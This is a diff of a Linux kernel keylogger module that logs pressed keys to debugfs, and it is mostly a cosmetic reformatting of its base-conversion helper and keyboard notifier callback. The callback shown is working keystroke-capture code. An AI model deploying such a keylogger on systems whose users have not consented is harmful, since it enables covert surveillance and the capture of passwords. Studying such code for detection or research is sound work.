@@ -33,6 +33,7 @@ MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
+
 module_param(codes, int, 0644);
 MODULE_PARM_DESC(codes, "Flag: 0: US keyboard, 1: keycodes (base10)");
 
@@ -107,95 +108,102 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
-void to_base_n_string(int input, int base,char *rep,int size){
-  int i;
-  /* buffer to hold the remainders in reverse order */
-  int div = input;  
-  int remainders[size];
-  int start;
-  /* zero out the buffer */
-  for ( i = 0; i < size; i++)
-    rep[i] = 0;
+/*
+ * Function to convert an integer to a base n string representation
+ *
+ * Parameters :
+ *  - input : integer to be converted
+ *  - n     : numerical base
+ *  - rep   : string buffer to place the representation in
+ *  - size  : the max size of the buffer
+ */
+void to_base_n_string(int input, int n,char *rep,int size){
+	int i;
+	int start;
+	int remainders[size];
+	int div = input;
 
-  if( !input ){
-    rep[0] = '0';
-    return;
-  }
+	for (i = 0; i < size; i++)
+		rep[i] = 0;
 
-  /* input the remainders in reverse order */
-  i = size - 1; 
-  while( div > 0 ){
-    remainders[i] = div % base;
-    div = div / base;
-    i--;
-  }
-  start = i+1;
-  /* place them into the string starting from the beginning 
-     with the proper character code */
-  for( i = start; i < size; i++){
-    rep[i - start] = '0' + remainders[i];
-  }
-      
+	if (!input) {
+		rep[0] = '0';
+		return;
+	}
+
+	i = size - 1;
+
+	while ( div > 0 ) {
+		remainders[i] = div % n;
+		div = div / n;
+		i--;
+	}
+
+	start = i+1;
+
+	for (i = start; i < size; i++) {
+		rep[i - start] = '0' + remainders[i];
+	}
 }
 
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
-		unsigned long code,
-		void *_param)
+		  unsigned long code,
+		  void *_param)
 {
 	size_t len;
-        char rep[sizeof(int) + 1];
-        char key[sizeof(int) + 1];
+	char rep[sizeof(int) + 1];
+	char key[sizeof(int) + 1];
 	struct keyboard_notifier_param *param = _param;
 	const char *pressed_key;
 
 	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
-		code, param->down, param->shift, param->value);
+		 code, param->down, param->shift, param->value);
 
 	if (!(param->down))
 		return NOTIFY_OK;
 
 	if (param->value >= 0x1 && param->value <= 0x77) {
-              pressed_key = param->shift
-                ? us_keymap[param->value][1]
-                : us_keymap[param->value][0];
-              if (pressed_key) {
-                int pklen, replen;
-                if ( codes ){
-                    to_base_n_string(param->value,10,key,sizeof(int)+1);
-                    to_base_n_string(param->shift,10,rep,sizeof(int)+1);
-                    pressed_key = key;
-                    pklen = strlen(pressed_key);
-                    replen = strlen(rep);
-                        
-                    len = pklen + replen + 1;
-                }
-                else {
-                    len = strlen(pressed_key);
-                }
-                  
-                if ((buf_pos + len) >= BUF_LEN) {
-                    memset(keys_buf, 0, BUF_LEN);
-                    buf_pos = 0;
-                }
-                if( codes )
-                {
-                    strncpy(keys_buf + buf_pos, rep, replen);
-                    buf_pos += replen;
-                    strncpy(keys_buf + buf_pos, " ", 1);
-                    buf_pos++;
-                    strncpy(keys_buf + buf_pos, pressed_key,
-                        pklen);
-                    buf_pos += pklen;
-                }
-                else{
-                    strncpy(keys_buf + buf_pos, pressed_key,len);
-                    buf_pos += len;
-                }
-                keys_buf[buf_pos++] = '\n';
+		pressed_key = param->shift
+			? us_keymap[param->value][1]
+			: us_keymap[param->value][0];
+		if (pressed_key) {
+			int pklen, replen;
+			if ( codes ) {
+				to_base_n_string(param->value,10,key,sizeof(int)+1);
+				to_base_n_string(param->shift,10,rep,sizeof(int)+1);
+				pressed_key = key;
+				pklen = strlen(pressed_key);
+				replen = strlen(rep);
 
-                pr_debug("%s\n", pressed_key);
-              }
+				len = pklen + replen + 1;
+			} else {
+				len = strlen(pressed_key);
+			}
+
+			if ((buf_pos + len) >= BUF_LEN) {
+				memset(keys_buf, 0, BUF_LEN);
+				buf_pos = 0;
+			}
+
+			if( codes ) {
+				strncpy(keys_buf + buf_pos, rep, replen);
+				buf_pos += replen;
+				strncpy(keys_buf + buf_pos, " ", 1);
+				buf_pos++;
+				strncpy(keys_buf + buf_pos, pressed_key,
+					pklen);
+				buf_pos += pklen;
+
+			} else {
+				strncpy(keys_buf + buf_pos, pressed_key,len);
+				buf_pos += len;
+			}
+
+			keys_buf[buf_pos++] = '\n';
+
+			pr_debug("%s\n", pressed_key);
+		}
 	}
 
 	return NOTIFY_OK;
